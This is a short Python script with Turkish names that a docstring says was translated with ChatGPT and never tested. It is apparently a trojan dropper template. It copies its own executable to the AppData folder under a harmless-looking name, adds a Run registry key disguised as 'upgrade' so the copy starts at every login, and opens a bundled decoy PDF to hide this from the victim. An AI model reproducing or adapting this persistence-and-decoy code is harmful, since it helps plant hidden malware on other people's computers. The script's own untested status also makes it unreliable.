"""chat gpt ile türkçeleştirildi denenmedi"""
import time
import subprocess
import os
import shutil
import sys

def kayit_defterine_ekle():
    # kalıcılık
    yeni_dosya = os.environ["appdata"] + "\\pythonegitim.exe"
    if not os.path.exists(yeni_dosya):
        shutil.copyfile(sys.executable, yeni_dosya)
        regedit_komutu = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + yeni_dosya
        subprocess.call(regedit_komutu, shell=True)

kayit_defterine_ekle()

def eklenen_dosyayi_ac():
    if hasattr(sys, '_MEIPASS'):
        eklenen_dosya = os.path.join(sys._MEIPASS, "yazbel.pdf")
    else:
        eklenen_dosya = os.path.join(os.path.dirname(__file__), "yazbel.pdf")
    subprocess.Popen(eklenen_dosya, shell=True)

eklenen_dosyayi_ac()

x = 0
while x < 100:
    print("python")
    x += 1
    time.sleep(0.5)
